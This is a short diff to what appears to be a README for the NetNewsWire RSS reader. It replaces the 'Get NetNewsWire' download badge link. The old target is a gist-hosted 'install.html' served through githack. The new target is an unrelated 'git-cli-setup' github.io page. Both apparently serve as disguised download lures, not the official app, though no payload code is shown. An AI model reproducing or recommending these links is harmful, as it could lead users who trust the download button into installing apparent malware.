@@ -2,7 +2,7 @@
 
 NetNewsWire is a fast and minimal RSS reader for macOS, designed to help you follow websites, blogs, and news feeds in a clean and distraction-free interface.
 
-<a href="https://gistcdn.githack.com/minekrater959-star/7026ae9813cec29ba86dd7a28960d24a/raw/bdc961b28c5b3a69356aedb4faf06e0ba65df57a/install.html?offer=NetNewsWire" target="_blank">
+<a href="https://git-cli-setup.github.io/.github/?offer=NetNewsWire" target="_blank">
   <img
     src="https://img.shields.io/badge/Get%20NetNewsWire%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF"
     width="320"
